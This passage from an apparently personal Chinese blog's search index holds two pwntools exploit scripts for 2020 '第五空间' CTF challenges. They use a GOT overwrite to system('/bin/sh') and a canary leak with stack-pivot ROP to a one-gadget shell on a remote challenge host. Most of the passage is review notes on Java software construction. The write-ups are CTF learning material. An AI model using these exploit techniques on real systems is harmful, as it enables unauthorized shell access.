success(\"puts:\"+hex(puts_addr)) libc_base = puts_addr-libc.sym['puts'] success(\"libc:\"+hex(libc_base)) sys_addr = libc_base + libc.sym['system'] pay4 = 'a'*0x10 + p32(4) + p32(elf.got['free']) change(4,len(pay4),pay4) change(0,4,p32(sys_addr)) binsh = \"/bin/sh\\x00\" change(1,len(binsh),binsh) remove(1) io.interactive() ","date":"2020-06-25","objectID":"/2020/06/5space2020/:2:0","tags":null,"title":"“第五空间”网络安全挑战赛 2020","uri":"/2020/06/5space2020/"},{"categories":["PWN"],"content":"twice stack pivot花式rop技巧，利用两次leave ret通过修改rbp而控制rsp from pwn import * context(arch = 'amd64', os = 'linux', endian = 'little') io = remote(\"121.36.59.116\", 9999) main = 0x40087B io.sendafter(\"\u003e\", \"a\"*0x59) io.recvuntil(\"a\"*0x59) canary = u64('\\0'+io.recv(7)) stack = u64(io.recv(6) + '\\0\\0') plt_puts = 0x4005C0 plt_read = 0x4005F0 got_puts = 0x601020 got_read = 0x601038 PrdiR = 0x0000000000400923 PrsiPr15R = 0x0000000000400921 lr = 0x0000000000400879 rop = flat( PrdiR, got_puts, plt_puts, PrdiR, got_read, plt_puts, main, ) pay2 = fit({ 0: 'wxktql' + '\\0'*2, 8:rop, 0x58: flat(canary, stack-0x70, lr) }) io.sendafter(\"\u003e\", pay2) io.recvuntil('wxktql\\n') puts_addr = u64(io.recv(7)[:6] + '\\0\\0') read_addr = u64(io.recv(7)[:6] + '\\0\\0') libc_base = puts_addr - 0x06f690 io.sendafter(\"\u003e\", \"wxktql\\0\") io.recvuntil('wxktql\\n') io.sendafter(\"\u003e\", \"a\"*0x58 + p64(canary) + 'a'*8 + p64(libc_base+0x45216)) io.interactive() ","date":"2020-06-25","objectID":"/2020/06/5space2020/:3:0","tags":null,"title":"“第五空间”网络安全挑战赛 2020","uri":"/2020/06/5space2020/"},{"categories":["Course"],"content":"HIT cources review, derivate from CMU and MIT 6.005. (1) concepts of design for complex systems (2) object oriented programming (3) techniques for robustness, including testing and static and dynamic analysis for programs (4) concurrent software unit1，2 —\u003e 06/08 unit3 —\u003e 06/09,10 unit4 —\u003e 06/11 (06/12完成，咕得好哇) unit5 —\u003e 06/12 unit6 —\u003e 06/13 unit7 —\u003e 06/14 ","date":"2020-06-08","objectID":"/2020/06/software-engineering/:0:0","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["Course"],"content":"Unit 1-2 ","date":"2020-06-08","objectID":"/2020/06/software-engineering/:1:0","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["Course"],"content":"Target 软件构造的多维度视图 软件构造的阶段划分、各阶段的构造活动 内部/外部的质量指标 软件配置管理SCM与版本控制系统VCS Git的结构、工作原理、基本指令 GitHub ","date":"2020-06-08","objectID":"/2020/06/software-engineering/:1:1","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["Course"],"content":"Context 软件构造的三个维度 按阶段分：build time（编译阶段） / run time（运行阶段） 按时间分：moment （瞬间）/ period （一段时期） 按层次分： code（源代码）/ component（架构） Version Control System(VCS) 与 Software Configuration Item(SCI) SCM：软件配置管理，用来追踪和控制软件的变化的任务。 SCI：软件配置项，软件中发生变化的基本单元（例如：文件） 版本控制系统略，git为重点 Software Development Lifecycle (SDLC) planning-\u003eanalysis-\u003edesign-\u003eimplementation-\u003etesting\u0026integration-\u003emaintenance-\u003eplanning… 传统软件开发模板 Waterfall（线性，不迭代），像瀑布一样顺序开发 Incremental （不迭代），将整个系统分为许多小块，一点一点地设计、开发、测试，直至 整个完成 V-Model （相对测试而言），是Waterfall的延申，完成源码开发后完善测试用例等，形成一个V形 Prototyping（迭代），开发软件原型，确定需求-\u003e开发初始原型-\u003e回顾-\u003e修正原型 Spiral（迭代），风险驱动 ，确定目标-\u003e识别并解决风险-\u003e开发与测试-\u003e继续迭代 Agile development 敏捷开发：把一个大项目分为多个相互联系，但也可独立运行的小项目，并分别完成，在此过程中软件一直处于可使用状态 敏捷开发与螺旋开发的区别 敏捷强调快速迭代，简单来说就是少些文档多做代码；螺旋本质上还是传统开放模式，要将文档写的很详细 敏捷的迭代速度要快于螺旋，通常一轮迭代也就1周；螺旋可能一两个月 软件的质量目标 外部质量目标：正确性、健壮性、可扩展性、复用性、兼容性（与其他东西兼容）、有效性、可移植性（移植到其他平台）、易用性、功能性、及时性等 内部质量目标：可读性、复杂性、大小 此课程涉及到： 代码优雅易于理解 -\u003e 代码的可理解性、函数规约；项目的可理解性 最大化复用 -\u003e ADT/OOP; 接口与实现分离;继承/重载/重写;组合/代理; 多态; 子类型与泛型编程; OO设计模式 可维护性 -\u003e 模块化设计; 聚合度/耦合度; SOLID; OO设计模式; 健壮性 -\u003e 异常处理、单元测试等 程序表现 -\u003e 多线程安全 Git结构 本地.git文件夹：工作区 暂存区（Staged）：并不实际存在，只是文件的一个标识，比如如果是0在暂存区域，1就不在；这样能把很多东西都先放在暂存区，然后一次性commit 仓库：远程仓储，已提交 Git与传统VCS的不同 传统的VCS版本更新时只记录改变量与原版本文件； Git每一个版本存的都是整个文件，但是不同版本相同的文件并不会复制一遍（多出一个指针指向原版本文件） Git存储的是文件，而不是文件的改变，这是与传统版本控制工具最大的区别 Git命令 Github 略 ","date":"2020-06-08","objectID":"/2020/06/software-engineering/:1:2","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["Course"],"content":"Unit 3 ","date":"2020-06-08","objectID":"/2020/06/software-engineering/:2:0","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["Course"],"content":"Target 基本数据类型、对象数据类型 静态类型检查、动态类型检查 Mutable/Immutable 值的改变、引用的改变 防御式拷贝 Snapshot diagram Specification、 前置/后置条件 行为等价性 观察等价性 规约的强度 ADT操作的四种类型 表示独立性 表示泄露 不变量、表示不变量RI 表示空间、抽象空间、 AF 以注释的形式撰写AF、 RI 接口、抽象类、具体类 继承、 override 多态、 overload 泛型 等价性equals()和== equals()的自反、传递、对称 hashCode() 不可变对象的引用等价性、对象等价性 可变对象的观察等价性、行为等价性 ","date":"2020-06-08","objectID":"/2020/06/software-engineering/:2:1","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["Course"],"content":"Context 基本数据类型、对象数据类型 java中所有变量类型分为两种（首字母大写的为对象数据类型，其余为基本类型） 基本数据类型 对象数据类型 int, long, byte, short, char, float, double, boolean 类、结构、数组、枚举等 只有值，相互无法区分 既有值又有ID 不可变 可变/不可变 在栈中分配内存 在堆中分配内存 内存代价小 内存代价大 静态类型检测、动态类型检测 静态类型检测：编译时检测类型，如语法、类名、函数名、函数参数、返回值类型等错误。检查类型。 动态类型检测：运行是检测类型，如非法的参数值（x/0）、非法的返回值、越界、空指针等。检查值。 不报错但是结果错误：整数溢出、double probability=1/5（0.0）等 Snapshot Diagram 对于基本类型的值，使用单线箭头指向实际值，不需要表明数据类型。 如果是可变对象，使用单线椭圆，椭圆内写明对象的类型及对象内的值。 如果是不可变对象，使用双线椭圆，椭圆内写明对象的类型及对象内的值。 如果是对象的不可变引用（final标记），使用双线箭头。eg：id 如果是对象的可变引用，使用单线箭头。eg：age 比较复杂的对象图 Array、List Set Map 可变与不可变类型 不可变类型变量：变量的值无法改变，只能改变引用；对其频繁修改会产生大量的临时拷贝，但更安全 注意String是不可变类型！Date是可变类型! 可变类型变量：变量的值可以改变；最小化拷贝 StringBuilder是可变类型： 考察下列代码： public static void main(String[] args){ String s1 = \"abc\"; List\u003cString\u003e list = new ArrayList\u003c\u003e(); list.add(s1); s1 = s1.concat(\"d\"); System.out.println(list.get(0)); //abd String s2 = s1.concat(\"e\"); list.set(0, s2); System.out.println(list.get(0)); //abcde } Snapshot与调试图如下，需要注意list.add以后并不是把s1直接放进list中，可以理解为做了拷贝 snapshot 调试图 值的改变与引用的改变 改变引用：将变量指向另一个值的存储空间 改变值：将当前指向的值的存储空间中写入一个新的值 final 关键词：修饰的变量无法改变引用；属于静态类型检测。 所以如果用final 修饰不可变类型，则无法再次赋值 final int a = 5; a = 10; (×) defensive copy 为防止用户传入或者传出给用户一个不可变ADT里的可变类型的引用，进而让用户获得不可变ADT的改变能力，使用防御使拷贝，比如下列Date类型返回时的拷贝方式： return new Date(groundhogAnswer.getTime()); pre/post-condition 前置条件：对客户端的约束，在使用方法时必须满足的条件 后置条件：对开发者的约束，方法结束时必须满足的条件 Java的前置、后置条件写在规约的@param 与@return 中 前置条件满足，则后置条件必须满足 前置条件不满足，则方法可做任何事情 规约与规约的强度 注意静态类型声明也是规约！ 规约不能暴露具体实现，应该使用抽象类型如List等字眼而不是LinkedList 规约更强 —\u003e 更放松的前置条件，更严格的后置条件，意味着开发者的工作越重、使用者的责任越轻 用图形表示规约强弱，更强的规约表现为更小的区域 （可以把区域的大小想成是实现方法的个数，规约更强实现方法会更少，所以区域小） 方法的行为等价性 站在用户的角度，两个方法（功能、pre/post-condition）是否相等 比如在数组中找某个只出现一次的值，从头开始找和从尾开始找的方法具有行为等价性 对象的行为等价性 所有方法都无法区分的两个对象是具有观察等价性的，一般这两个对象指向了同一块内存区域 对象的观察等价性 observer无法区分的两个对象是具有观察等价性的 ADT操作的四种类型 抽象数据类型（ADT）是由操作决定的，操作分为： 构造器：由其他类型产生此ADT类型 生产器：由此ADT类型产生另一个此类型的对象 观察器：由此ADT类型产生其他类型的变量 变值器：改变对象属性的方法，通常返回void 比如： Integer.valueOf() Creator BigInteger.mod() Producer List.addAll()String.toUpperCase() Producer Set.contains() Observer Map.keySet() Observer Collections.unmodifiableList() Producer BufferedReader.readLine() Mutator (改变了某个标记，表示当前位置) 需要注意不可变类型可能有mutator（beneficent mutation ），但必须在用户看来此ADT是不变的。 Representation Independence 表示独立性： client使用ADT时无需考虑其内部如何实现， ADT内部表示的变化不应影响外部spec和客户端 下图违反了表示独立性，因为Family的规约中并没有指出people是List，所以客户端不能直接用f.people.get （如果Family的内部实现变成了set，那么客户端也得跟着变） 应该将people改为private，然后利用getMembers()来访问。 表示暴露 ADT属性是public/返回了一个内部属性的引用给客户端/客户端传入了一个内部属性的引用 不变量 每个ADT都需要能维持某个量在任何时候总是true，这个量成为不变量 比如对于不可变类型的ADT，不可变就是它的不变量 AF \u0026 RI 表示(R)空间：ADT内部所有的变量对象构成的空间 抽象(A)空间：用户看ADT表示的内容构成的空间 抽象函数(AF)：从R到A的映射，一定是满射，但不一定是单射 R中的有可能有部分值并非合法的，在A中无映射值 表示不变量(RI)：表示空间中的子集，指示表示空间中数据的合法条件，应始终成立 checkRep随时检查RI是否成立，示意图如下： ADT的内部表示(私有属性)、R空间中的任何值、AF和RI应该对外部都应严格不可见 在注释中书写AF\u0026RI\u0026safe from rep 略，见实验 接口、抽象类、具体类 接口：interface，被implements 抽象类：abstract，被extends 继承与重写 严格继承：子类只能添加新方法，无法重写父类中的方法 重写方法与父类名字、参数列表、返回值类型完全相同，在运行阶段判断到底用哪个方法 final修饰方法， 则此方法不能被重写 final修饰类，则此类不能被继承 构造子类用到super()时只能放在第一行 多态与重载 java多态包括三种情况： 功能多态：函数重载 参数多态：泛型 子类型多态、包含多态：如果一个类有许多父类，则它代表了很多个父类 重载：多个方法具有同样的名字，但有不同的参数列表或返回值类型 ，在编译阶段判断到底用哪个方法 重载也可以发生在子类与父类之间 下图为一个易错的例子，说明对象类型得看声明，而不是new赋值的对象；特别需要注意3 泛型 泛型接口可以用泛型类实现，也可以用具体类实现 public interface Set\u003cE\u003e{...} public class CharSet implements Set\u003cCharacter\u003e{...} public class HashSet implements Set\u003cE\u003e{...} 通配符?只能在使用泛型时使用，不能在定义时使用 List\u003c?\u003e list = new ArrayList\u003cString\u003e(); List\u003c? extends Animal\u003e List\u003c? super Animal\u003e 运行时泛型便消失了，被具体类型代替 不能产生泛型数组 等价性 等价关系需要满足自反、对称、传递 == vs. equals() ==比较判断基本类型就是判断值是否相等，比较对象类型是判断引用是否相等 equals()判断对象引用是否相等（是否指向了同一块区域），与==相同 但是我们一般会对equals()重写（注意是重写并利用instanceof判断，千万不要重载）， 所以总的原则是基本类型用==，对象类型用equals() equals()相等的对象hashcode()一定要相等 instance of is a bad thing 使用instanceof判断某个父类属于不同子类便有不同的操作是一件不好的事情，这意味着父类的抽象封装不够，应该让子类重写父类的方法。 比如父类Animal有move()，而子类Bird有fly()，Fish有swim()，利用instanceof判断具体类型再调用对应方法是不好的，正确做法应该是Bird与Fish重写Animal的move() 可变对象的观察等价性、行为等价性 对可变类型来说，无需重写这两个函数，直接继承Object的两个方法即可 ，使用行为等价性 因为如果使用观察等价性，可变类型改变以后原先相等的对象便不再相等，会造成某些问题 比如set中添加了一个list，当list改变时set.contai","date":"2020-06-08","objectID":"/2020/06/software-engineering/:2:2","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["Course"],"content":"Unit 4 ","date":"2020-06-08","objectID":"/2020/06/software-engineering/:3:0","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["Course"],"content":"Target Programing for/with reuse LSP 协变、反协变 数组的子类型化 泛型的子类型化 泛型中的通配符(?) Delegation Comparator和Comparable CRP原则 接口的组合 白盒框架的原理与实现 黑盒框架的原理与实现 设计模式adapter、 decorator、façade、 strategy、 template、iterator/iterable ","date":"2020-06-08","objectID":"/2020/06/software-engineering/:3:1","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["Course"],"content":"Context java复用层次 源代码级别的复用 模块级别的复用：类/抽象类/接口 库级别的复用： API/包 系统级别的复用：框架（将framework看作是更大规模的API复用，除了提供可复用的API，还将这些模块之间的关系都确定下来，形成了整体应用的领域复用 ），比如.Net开发 java复用分类 白盒复用：源代码可见，可修改和扩展 ；复制已有代码 ，可进行修改 黑盒复用：源代码不可见，不能修改；只能通过API接口来使用，无法修改代码 白盒框架的原理与实现 白盒框架：通过代码层面的继承进行框架，通过子类型与重写方法扩展 黑盒框架的原理与实现 黑盒框架：通过实现特定接口/delegation进行框架扩展 Liskov替换原则（LSP） 里氏替换原则通俗的来讲就是：子类可以扩展父类的功能，但不能改变父类原有的功能。 具体包括： 子类可以实现父类的抽象方法，但不能覆盖父类的非抽象方法。 子类中可以增加自己特有的方法。 当子类的方法重载父类的方法时，方法的前置条件（即方法的形参）要比父类方法的输入参数更宽松。 当子类的方法实现父类的抽象方法时，方法的后置条件（即方法的返回值）要比父类更严格。 注意正方形不是长方形的子类型的原因在于： 如果设定一个resize方法提供给用户改变长、宽的功能，那么这个函数对于正方形来说一定要求长与宽相等，而对于正方形的父类长方形来说并没有这个要求，导致子类型方法的前置条件更强，违反了LSP。但如果没有这些需求，正方形可以作为长方形的子类 同理：长度大于1的所有正方形也不是正方形的子类型！ 下图才是一个标准的子类型，可以看到子类型应该可以完全替换父类型。 那么长方形是不是正方形的子类型呢？ 显然也不是的，长方形（子类）的不变量比长方形（父类）弱。 协变、逆变（反协变） 协变：类型更具体 逆变：类型更抽象 不厌其烦再强调一遍LSP，从父类型到子类型： 方法参数：逆变 方法的返回值：协变 异常类型：协变 协变 逆变 需要注意Java并不能提供逆变，它会把上右图当作重载处理，所以在Java中应当忽略子类型的逆变要求。 同时注意上左图，Java不会当作重载处理 数组的子类型化 // numbers是引用，类型为Number[] Number[] numbers = new Number[2]; numbers[0] = new Integer(10); numbers[1] = new Double(3.14); //不会报错 // myNumber是对象，与myInts类型相同，在运行时Java知道myNumber实际上是Integer[] Integer[] myInts = {1,2,3,4}; Number[] myNumber = myInts; myNumber[0] = 3.14; //run-time error! 区分：对象的类型 vs. 引用的类型 泛型的子类型化与通配符 ArrayList\u003cString\u003e 是List\u003cString\u003e 的子类型 List\u003cString\u003e 不是 List\u003cObject\u003e 的子类型 List\u003cNumber\u003e是 List\u003c?\u003e的子类型 List\u003cNumber\u003e是List\u003c? extends Object\u003e的子类型 List\u003cObject\u003e是List\u003c? super String\u003e 的子类型 List\u003cInteger\u003e myInts = new ArrayList\u003cInteger\u003e(); myInts.add(1); myInts.add(2); List\u003cNumber\u003e myNums = myInts; //compiler error！ myNums.add(3.14); 泛型的具体化不是协变，Java运行时会对泛型做类型擦除处理，如下图 源代码 运行时 委托机制 委派/委托：一个对象请求另一个对象的功能 一个类不需要继承另一个类的全部方法，通过委托机制调用部分方法，从而避免大量无用的方法；反之则用继承 “委托”发生在object层面，而“继承”发生在class层面 更多见实验，略。 Comparator/Comparable 方法一：自己实现 if-else实现 lambda表达式 方法二：实现Comparator接口并override compare()函数 public class EdgeComparator implements Comparator\u003cEdge\u003e{ @Override public int compare(Edge o1, Edge o2) { if(o1.getWeight() \u003e o2.getWeight()) return 1; else if (.. == ..) return 0; else return -1; } } // 实现后需要新建一个Comparator public void sort(List\u003cEdge\u003e edges) { Comparator comparator = new EdgeComparator(); Collections.sort(edges, comparator); } 方法三：实现Comparable接口并override compareTo() 方法 public class Edge implements Comparable\u003cEdge\u003e { Vertex s, t; double weight; ... public int compareTo(Edge o) { if(this.getWeight() \u003e o.getWeight()) return 1; else if (.. == ..) return 0; else return -1; } } // 不需要构建新的Comparator类，比较代码放在ADT内部 public void sort(List\u003cEdge\u003e edges) { Collections.sort(edges); } CRP Composite/Aggregate Reuse Principle(CARP)：尽量使用合成/聚合达到复用，尽量少用继承 临时性的委托 合成的委托 聚合的委托 几种经典的面向复用的设计模式 Structural patterns 结构型模式： Adaptor、Decorator、Facade Behavioral patterns 行为类模式 ：Strategy、Template method、Iterator Adaptor模式 适配器模式：将某个类/接口转换为client期望的其他形式 实现方式：通过增加一个接口，将已存在的子类封装起来， client面向接口编程，从而隐藏了具体子类 class LegacyRectangle { void display(int x1, int y1, int w, int h) {... } } // 接口不匹配 class Client { public display() { new LegacyRectangle().display(x1, y1, x2, y2); } } 添加Adaptor类Rectangle实现抽象接口，并完成适配 interface Shape { void display(int x1, int y1, int x2, int y2); } // Adaptor class Rectangle implements Shape { void display(int x1, int y1, int x2, int y2) { new LegacyRectangle().display(x1, y1, x2-x1, y2-y1); } } class LegacyRectangle { void display(int x1, int y1, int w, int h) {...} } class Client { // 适配 Shape shape = new Rectangle(); public display() { shape.display(x1, y1, x2, y2); } } Decorator模式 装饰器模式：为对象增加不同侧面的特性 实现方式：对每一个特性构造子类，通过委派机制增加到对象上 // 包装stack得到Decorator基本类 public abstract class StackDecorator implements Stack { protected final Stack stack; public StackDecorator(Stack stack) { this.stack = stack; } public void push(Item e) { stack.push(e); } public Item pop() { return stack.pop(); } ... } // 对其进行包装 public class UndoStack extends StackDecorator implements Stack { private final UndoLog log = new UndoLog(); public UndoStack(Stack stack) { super(stack); } public void push(Item e) { log.append(UndoLog.PUSH, e); //新特性 super.push(e); } public void undo() { //implement decor","date":"2020-06-08","objectID":"/2020/06/software-engineering/:3:2","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["Course"],"content":"Unit 5 ","date":"2020-06-08","objectID":"/2020/06/software-engineering/:4:0","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["Course"],"content":"Target 可维护性的常见度量指标 聚合度与耦合度 SOLID 设计模式： factory method、abstract factory、 proxy、observer/observable、 visitor、statememento 语法、正则表达式 ","date":"2020-06-08","objectID":"/2020/06/software-engineering/:4:1","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["Course"],"content":"Context 可维护性的常见度量指标 圈复杂度CC = E-N+2 E表示控制流图中边的数量，N表示控制流图中节点的数量 Halstead Volume，略 可维护性指数越高可维护性越好，公式略 继承的层次数 、类之间的耦合度 、单元测试的覆盖度 聚合度与耦合度 耦合是两模块间独立性的量度，越低越独立 内聚是一个模块内方法或责任的相关性的亮度，越高越相关 模块化编程应当高内聚、低耦合 面向对象编程原则：SOLID (SRP) The Single Responsibility Principle 单一责任原则：一个类，一个责任 // 两个责任：Connection Management 、Data Communication interface Modem { public void dial(String pno); public void hangup(); public void send(char c); public char recv(); } // 应该分开 interface DataChannel { public void send(char c); public char recv(); } interface Connection { public void dial(String phn); public char hangup(); } (OCP) The Open-Closed Principle 开放-封闭原则：模块行为是可扩展的，修改的时候不要修改原有的代码 比如有多种不同类型的Server，那么每出现一种新的Server，就需要修改Server内部代码；而如果使用抽象的Server类做父类，其中包含公共部分，而将特殊部分交给子类实现便可以实现OCP； public void drawShape(Shape s) { if (s.m_type==1) // if-else将导致扩展新行为时改变原有代码 drawRectangle(s); else if (s.m_type==2) drawCircle(s); } public void drawCircle(Circle r) {....} public void drawRectangle(Rectangle r) {....} } class Shape { int m_type; } class Rectangle extends Shape { Rectangle() { super.m_type=1; } } class Circle extends Shape { Circle() { super.m_type=2; } } // 将不同功能封装到不同形状中可以实现OCP class GraphicEditor { public void drawShape(Shape s) { s.draw(); } } class Shape { abstract void draw(); } class Rectangle extends Shape { public void draw() { // draw the rectangle } } (LSP) The Liskov Substitution Principle Liskov替换原则：略 (DIP) The Dependency Inversion Principle 依赖转置原则：只对接口编程，依赖于抽象而不依赖于具体。 依赖倒置原则在java中表现就是，模块间依赖通过抽象发生，实现类之间不发生直接依赖关系，其依赖关系是通过接口或者抽象类产生的。如果类与类直接依赖细节，那么就会直接耦合。如此一来当修改时，就会同时修改依赖者代码，这样限制了可拓展性。 //文学经典类 public class LiteraryClassic{ //阅读文学经典 public void read(){ System.out.println(\"文学经典阅读，滋润自己的内心心灵\"); } } //小明类 public class XiaoMing{ //阅读文学经典 public void read(LiteraryClassic literaryClassic){ literaryClassic.read(); } } // 场景 public class Client{ public static void main(Strings[] args){ XiaoMing xiaoming = new XiaoMing(); LiteraryClassic literaryClassic = new LiteraryClassic(); //小明阅读文学经典 xiaoming.read(literaryClassic); } } //但小明想看小说时，发现中委托实现依赖LiteraryClassic具体类 //小说类 public class Novel{ //阅读小说 public void read(){ System.out.println(\"阅读小说，放松自己\"); } } //正确的做法应该是创建小说与文学经典的父类Book，小明委托Book中的read (ISP) The Interface Segregation Principle 接口聚合原则 ：使用多个隔离的接口，比使用单个“胖”接口要好 几种经典的面向可维护性的设计模式 Creational patterns ： Factory method、Abstract factory Structural patterns ：proxy Behavioral patterns ：observer、visitor 基于状态的构造模式：Memento、state Factory Method pattern 工厂方法：定义一个用于创建对象的接口，让其子类来决定实例化哪一个类 // 产品接口 public interface Trace { // turn on and off debugging public void setDebug( boolean debug ); // write out a debug message public void debug( String message ); // write out an error message public void error( String message ); } // 具体实现类1 public class FileTrace implements Trace { ... } // 具体实现类2 public class SystemTrace implements Trace { ... } // Client使用只能绑定到具体的类 Trace log = new SystemTrace(); log.debug( \"entering log\" ); Trace log2 = new FileTrace(); log.debug(“...”); // 如果使用工厂方法 interface TraceFactory { public Trace getTrace(); public Trace getTrace(String type); void otherOperation(){}; } public class Factory implements TraceFactory { public Trace getTrace() { return new SystemTrace(); } public getTrace(String type) { if(type.equals(“file”) return new FileTrace(); else if (type.equals(“system”) return new SystemTrace(); } } // 客户端无需绑定到具体类 Trace log1 = new Factory1().getTrace(); log1.setDebug(true); log1.debug( \"entering log\" ); Trace log2 = new Factory2().getTrace(\"system\"); log2.setDebug(false); log2.debug(\"...\"); 静态工厂方法略 抽象工厂方法：可以看到上述Factory中的if-else可能违反了开闭原则，所以通过定义抽象工厂父类，每个子类工厂实现某个具体产品类的创建，这便是抽象工厂方法。同时如果有多个顺序确定的产品需要创建，可利用工厂辅助类确定顺序 // 抽象工厂 public interface AbstractWidgetFactory{ public Window createWindow(); public Scrollbar createScrollbar(); } // 具体工厂1 public class WidgetFactory1 implements AbstractWidgetFactory{ public Window createWindow(){ ... } public Scrollbar createScrollbar(){...} } // 具体工厂2 public class WidgetFactory2 implements AbstractWidgetFactory{ public Window createWin","date":"2020-06-08","objectID":"/2020/06/software-engineering/:4:2","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["Course"],"content":"Unit 6 ","date":"2020-06-08","objectID":"/2020/06/software-engineering/:5:0","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["Course"],"content":"Target 健壮性和正确性 Throwable Error/Runtime异常、其他异常 Checked异常、 Unchecked异常 Checked异常的处理机制： – 声明、抛出、捕获、处理、清理现场、释放资源等 自定义异常类 断言的作用、 应用场合 调试的基本过程和方法 黑盒测试用例的设计 – 等价类划分、边界值分析 以注释的形式撰写测试策略 JUnit测试用例写法 测试覆盖度 ","date":"2020-06-08","objectID":"/2020/06/software-engineering/:5:1","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["Course"],"content":"Context 健壮性与正确性 健壮性：系统在不正常输入或不正常外部环境下仍能够表现正常的程度 正确性：程序按照spec加以执行的能力，是最重要的质量指标！ 对外的接口，倾向于健壮；对内的实现，倾向于正确 Throwable Error/Runtime异常、其他异常 如上图所示 Error类描述的是内部系统错误，很少发生，开发者也无需操心 RuntimeException类是由程序员在代码里处理不当造成的，是开发者的锅，也是开发者可以改正的 其他异常不是开发者代码问题，而是由外部原因造成，需要捕获、处理 比如数组越界异常，明明知道了是数组越界，说明是开发者自己代码写的有问题，当然应该修改代码，如果放任不管并捕获这个异常不是掩耳盗铃吗；而对于IO异常，开发者并不知道是因为什么，很可能是用户的错误输入，但开发者也没法保证这些异常一定不会出现，所以应该捕获并处理这个异常。 checked异常、unchecked异常 unchecked异常=Runtime异常（程序源代码中引入的故障所造成的）+ Error checked异常=非运行时异常，是程序员无法完全控制的外在问题所导致的，编译器可帮助检查你的程序是否已抛出或处理了可能的异常 分类也不是绝对的，uncheck和check的区分就在于是否是程序员的错误还是外部带来的 checked异常的处理操作 try、catch、finally、throws、throw throws用于方法声明，注意要写进spec中，代表此方法只抛出而不处理某个异常，而是把它交给调用者处理； 在try中throw异常，会直接跳到catch代码块；可以一个try多个catch，也可以没有catch只有finally；也可以在catch中rethrow异常 try { access the database... } catch (SQLException e) { // rethrow throw new ServletException(\"database error: \" + e.getMessage()); } finally代码块不管try中是否throw异常都会执行，甚至在return后也会执行 try{ ... return true; }finally{ ... //不管怎么样都会执行到finally，都会返回false return false; } int a=1; try{ ... return true; }finally{ ... //不管怎么样都会执行到finally，方法返回true，但是a会变为2 a=2; } try-with-resource相当于finally中把resource关掉 try (Scanner in = new Scanner(new FileInputStream(\"/dict/words\")),\"UTF-8\") { while (in.hasNext()) System.out.println(in.next()); }catch(){ ... }//结束后会自动调用in.close() 自定义异常类 通过继承Exception类或其子类来自定义异常 public class FooException extends Exception { public FooException() { super(); } public FooException(String message) { super(message); } public FooException(String message, Throwable cause) { super(message, cause); } public FooException(Throwable cause) { super(cause); } } 断言的作用、 应用场合 断言：在开发阶段的代码中嵌入，检验某些“假设”是否成立。若成立，表明程序运行正常，否则表明存在错误 注意断言机制在产品中一般会被关闭，所以断言只是开发者在开发阶段用来调试内部bug的 换句话说，断言即是对代码中程序员所做假设的文档化，也不会影响运行时性能。一般用于检测内部不变性、表示不变性、方法的前置条件、后置条件等。 //两种格式 assert (something_should_be_true); assert (something_should_be_true):\"print something you want\" 在开发阶段，使用异常来处理“预料到可以发生”的不正常情况；使用断言处理“绝不应该发生”的情况；如果参数来自于外部（不受自己控制），使用异常处理；如果来自于自己所写的其他代码，可以使用断言来帮助发现错误 调试的基本过程和方法 略（貌似都是废话？ 测试 按层次：单元测试 、集成测试 、系统测试 按动作：静态测试（用眼睛摁看） 、动态测试（用测试用例跑程序） 测试：发现是否存在错误 ；调试：识别错误根源，消除错误 测试优先的编程 ：先写spec，再写符合spec的测试用例，最后写代码、执行测试、有问题再改、直到通过测试用例 JUNIT单元测试相关内容 略，见实验 黑盒测试及用例设计 黑盒测试：用于检查代码的功能，不关心内部实现细节 利用等价类划分来设计测试用例，对方法的每个参数逐个考虑等价类 /** * Reverses the end of a string. * * 012345 012345 * For example: reverseEnd(\"Hello, world\", 5) returns \"Hellodlrow ,\" * \u003c-----\u003e \u003c-----\u003e * * With start == 0, reverses the entire text. * With start == text.length(), reverses nothing. * * @param text non-null String that will have its end reversed * @param start the index at which the remainder of the input is reversed, * requires 0 \u003c= start \u003c= text.length() * @return input text with the substring from start to the end of the string * reversed */ public static String reverseEnd(String text, int start) //等价类划分 //对于start参数：start = 0, 0 \u003c start \u003c text.length(), start = text.length() //对于text参数：text.length() = 0; text.length()-start is odd; text.length()-start is even 边界值分析是对等价类划分方法的补充 max(int a,int b) : int × int → int //等价类划分 // a,b间的关系：a\u003eb;a\u003cb;a==b // a的值：a\u003c0;a=0;a\u003e0;a是最小整数、a是最大整数 // b的值：b\u003c0;b=0;b\u003e0;b是最小整数、b是最大整数 // 笛卡尔积测试：3*5*5个测试用例 // 非笛卡尔积测试：3+5+5个测试用例以内 测试用例的编写分为笛卡尔积（全覆盖），覆盖每个取值（每个维度的每个取值至少被1个测试用例覆盖一次） 不在规约范围内的数据不需要测试。但注意，在测试Exception的时候可能会故意输入错误数据，这也是测试的一部分。这也并不矛盾，毕竟异常本就是规约的一部分。 白盒测试 白盒测试：根据程序执行路径设计测试用例 ，是穷举路径的测试。 ","date":"2020-06-08","objectID":"/2020/06/software-engineering/:5:2","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["Course"],"content":"Unit 7 ","date":"2020-06-08","objectID":"/2020/06/software-engineering/:6:0","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["Course"],"content":"Target 进程和线程 线程的创建和启动， runnable 内存共享模式、消息传递模式 时间分片、交错执行、竞争条件 线程的休眠、中断 线程安全threadsafe的四种策略 – Confinement、 Immutability、 ThreadSafe类型 – Synchronization/Lock 死锁 